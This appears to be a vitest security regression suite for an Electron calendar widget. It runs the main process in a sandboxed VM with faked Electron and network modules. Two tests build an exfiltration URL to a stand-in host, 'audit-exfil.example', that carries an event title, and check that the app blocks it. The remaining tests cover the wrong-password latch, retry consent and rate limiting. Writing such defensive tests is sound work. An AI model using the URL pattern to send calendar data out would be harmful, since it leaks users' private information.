// Real main IPC in an isolated VM: no profile reads, network, Electron windows or external browser.
import { buildSync } from 'esbuild';
import { EventEmitter } from 'node:events';
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import nodePath from 'node:path';
import { fileURLToPath } from 'node:url';
import vm from 'node:vm';
import { describe, expect, it, vi } from 'vitest';

import { type CalendarService } from '../src/main/calendarService';
import { type CreateMeetingInput, type Snapshot } from '../src/shared/types';

const require = createRequire(import.meta.url);
const root = nodePath.dirname(nodePath.dirname(fileURLToPath(import.meta.url)));
const bundle = buildSync({
    stdin: {
        loader: 'ts',
        contents: `${readFileSync(nodePath.join(root, 'src/main/index.ts'), 'utf8')}\nexport function auditBoot(demo: boolean) { service = new CalendarService(demo); registerIpc(); return service; }`,
        resolveDir: nodePath.join(root, 'src/main'),
        sourcefile: 'audit-main.ts',
    },
    bundle: true,
    platform: 'node',
    format: 'cjs',
    target: 'node24',
    write: false,
    external: ['electron'],
    logLevel: 'silent',
}).outputFiles[0].text;
function harness(demo: boolean) {
    const handlers = new Map<string, (...args: unknown[]) => unknown>();
    const opened = vi.fn();
    const confirm = vi.fn<(...args: unknown[]) => Promise<{ response: number }>>(async () => ({
        response: 0,
    }));
    let requests = 0;
    const fs = {
        existsSync: () => false,
        readFileSync: () => {
            throw new Error('No real profile');
        },
        mkdirSync: () => {},
        appendFileSync: () => {},
        writeFileSync: () => {},
        renameSync: () => {},
        rmSync: () => {},
        statSync: () => ({ size: 0, isFile: () => true }),
    };
    const electron = {
        app: {
            isPackaged: true,
            getVersion: () => 'test',
            getPath: () => '/audit-profile',
            getLocale: () => 'en',
            setAppUserModelId: () => {},
            disableHardwareAcceleration: () => {},
            commandLine: { appendSwitch: () => {} },
            on: () => {},
            whenReady: () => new Promise(() => {}),
        },
        ipcMain: {
            handle: (key: string, fn: (...args: unknown[]) => unknown) => handlers.set(key, fn),
            on: () => {},
        },
        protocol: { registerSchemesAsPrivileged: () => {}, handle: () => {} },
        shell: { openExternal: opened },
        dialog: { showMessageBox: confirm },
        BrowserWindow: { getAllWindows: () => [], fromWebContents: () => {} },
        Notification: { isSupported: () => false },
        session: {
            fromPartition: () => ({
                clearAuthCache: async () => {},
                closeAllConnections: async () => {},
                clearStorageData: async () => {},
                setUserAgent: () => {},
                allowNTLMCredentialsForDomains: () => {},
                setCertificateVerifyProc: () => {},
                cookies: { get: async () => [] },
            }),
        },
        net: {
            request: () => {
                // eslint-disable-next-line unicorn/prefer-event-target -- Electron network streams expose EventEmitter APIs; this fake must match them.
                const req = new EventEmitter() as EventEmitter & Record<string, unknown>;
                req.setHeader = () => {};
                req.write = () => {};
                req.abort = () => {};
                req.followRedirect = () => {};
                req.end = () =>
                    queueMicrotask(() => {
                        requests += 1;
                        // eslint-disable-next-line unicorn/prefer-event-target -- Electron network streams expose EventEmitter APIs; this fake must match them.
                        const res = new EventEmitter() as EventEmitter & {
                            statusCode: number;
                            headers: object;
                        };
                        res.statusCode = 401;
                        res.headers = {};
                        req.emit('response', res);
                        queueMicrotask(() => res.emit('end'));
                    });
                return req;
            },
        },
        safeStorage: { isEncryptionAvailable: () => false },
    };
    const mod = { exports: {} as { auditBoot: (demo: boolean) => CalendarService } };
    vm.runInNewContext(
        bundle,
        {
            module: mod,
            exports: mod.exports,
            require: (name: string): unknown => {
                if (name === 'electron') return electron;
                if (name === 'node:fs') return fs;
                // eslint-disable-next-line import-x/no-dynamic-require -- VM delegates Node builtins to the real loader after replacing Electron and profile I/O.
                return require(name) as unknown;
            },
            __dirname: nodePath.join(root, 'dist/main'),
            __filename: nodePath.join(root, 'dist/main/index.js'),
            Buffer,
            URL,
            URLSearchParams,
            AbortController,
            process: {
                platform: 'darwin',
                versions: process.versions,
                pid: process.pid,
                env: {},
                argv: ['audit'],
                on: () => {},
            },
            setTimeout,
            clearTimeout,
            setInterval,
            clearInterval,
            console,
            structuredClone,
        },
        { timeout: 5000 },
    );
    const service = mod.exports.auditBoot(demo);
    const frame = { url: 'owa-widget://app/index.html#/popup' };
    const event = {
        senderFrame: frame,
        sender: { mainFrame: frame, isDestroyed: () => false, send: () => {} },
    };
    const call = async <T = unknown>(key: string, ...args: unknown[]): Promise<T> =>
        (await handlers.get(`owa:${key}`)!(event, ...args)) as T;
    return { service, call, opened, confirm, requests: () => requests };
}
const meeting = (location: string): CreateMeetingInput => ({
    title: 'Private event',
    start: new Date(Date.now() + 3_600_000).toISOString(),
    end: new Date(Date.now() + 5_400_000).toISOString(),
    requiredAttendees: [],
    optionalAttendees: [],
    location,
    body: '',
    recurrence: { kind: 'none' },
});
describe('security audit regressions through real main-process IPC', () => {
    it('cannot authorize an exfiltration URL through an unconfirmed personal appointment', async () => {
        const h = harness(true);
        await h.service.syncNow();
        const snapshot = await h.call<Snapshot>('getSnapshot');
        const url = `https://audit-exfil.example/?data=${encodeURIComponent(snapshot.events[0].title)}`;
        expect(await h.call('createMeeting', meeting(url))).toEqual({ status: 'cancelled' });
        expect(h.confirm).toHaveBeenCalledOnce();
        await h.call('getSnapshot');
        await h.call('openUrl', url);
        expect(h.opened).not.toHaveBeenCalled();
    });
    it('still saves and opens a personal appointment after explicit native consent', async () => {
        const h = harness(true);
        h.confirm.mockResolvedValue({ response: 1 });
        await h.service.syncNow();
        const url = 'https://meeting.example/room';
        expect(await h.call('createMeeting', meeting(url))).toMatchObject({
            status: 'created',
            invited: 0,
        });
        expect(h.confirm).toHaveBeenCalledOnce();
        await h.call('getSnapshot');
        await h.call('openUrl', url);
        expect(h.opened).toHaveBeenCalledWith(url);
    });
    it('also refuses an unconfirmed URL change to an existing personal appointment', async () => {
        const h = harness(true);
        await h.service.syncNow();
        h.confirm.mockResolvedValue({ response: 1 });
        const input = meeting('https://meeting.example/original');
        await h.call('createMeeting', input);
        const event = h.service.events.find((e) => e.title === input.title)!;
        h.confirm.mockResolvedValue({ response: 0 });
        h.confirm.mockClear();
        const url = 'https://audit-exfil.example/changed';
        expect(await h.call('editMeeting', { ...input, id: event.id, location: url })).toEqual({
            status: 'cancelled',
        });
        expect(h.confirm).toHaveBeenCalledOnce();
        await h.call('getSnapshot');
        await h.call('openUrl', url);
        expect(h.opened).not.toHaveBeenCalled();
    });
    it('preserves the wrong-password latch through repeated cache resets', async () => {
        const h = harness(false);
        await h.service.syncNow();
        expect(h.requests()).toBe(1);
        for (let i = 0; i < 3; i++) {
            // eslint-disable-next-line no-await-in-loop -- Sequential requests exercise state transitions and retry limits in order.
            await h.call('clearCache');
            // eslint-disable-next-line no-await-in-loop -- Sequential requests exercise state transitions and retry limits in order.
            await h.service.syncNow();
        }
        expect(h.requests()).toBe(1);
        expect(h.service.sync.errorKind).toBe('auth');
    });
    it('cannot bypass a failed login through connection testing or saving a password', async () => {
        const h = harness(false);
        await h.service.syncNow();
        const update = { settings: h.service.settings, password: 'synthetic-wrong-password' };
        await expect(h.call('testConnection', update)).rejects.toThrow(/отмен|cancel/i);
        await expect(h.call('saveSettings', update)).rejects.toThrow(
            /отмен|cancel|подожд|wait|Слишком/i,
        );
        expect(h.requests()).toBe(1);
        expect(h.service.sync.errorKind).toBe('auth');
    });
    it('a failed connection test also blocks automatic attempts and cache recovery', async () => {
        const h = harness(false);
        expect(await h.call('testConnection', { settings: h.service.settings })).toMatchObject({
            ok: false,
        });
        await h.call('clearCache');
        await h.service.syncNow();
        expect(h.requests()).toBe(1);
    });
    it('allows one confirmed retry and rate-limits further recovery prompts', async () => {
        const h = harness(false);
        await h.service.syncNow();
        h.confirm.mockResolvedValue({ response: 1 });
        await h.call('testConnection', { settings: h.service.settings });
        expect(h.requests()).toBe(2);
        expect(h.confirm).toHaveBeenCalledOnce();
        await expect(h.call('testConnection', { settings: h.service.settings })).rejects.toThrow(
            /подожд|wait|Слишком/,
        );
        expect(h.requests()).toBe(2);
        expect(h.confirm).toHaveBeenCalledOnce();
    });
    it('does not ask for a new login when only the theme changes after a failure', async () => {
        const h = harness(false);
        await h.service.syncNow();
        await h.call('saveSettings', { settings: { ...h.service.settings, theme: 'dark' } });
        expect(h.confirm).not.toHaveBeenCalled();
        expect(h.requests()).toBe(1);
    });
    it('invalidates retry consent if cache recovery replaces the session while the dialog is open', async () => {
        const h = harness(false);
        await h.service.syncNow();
        let answer!: (value: { response: number }) => void;
        h.confirm.mockImplementation(
            () =>
                new Promise((resolve) => {
                    answer = resolve;
                }),
        );
        const pending = h.call('testConnection', { settings: h.service.settings });
        const checked = expect(pending).rejects.toThrow(/Аккаунт изменился/);
        await vi.waitFor(() => expect(h.confirm).toHaveBeenCalledOnce());
        await h.call('clearCache');
        answer({ response: 1 });
        await checked;
        expect(h.requests()).toBe(1);
    });
});
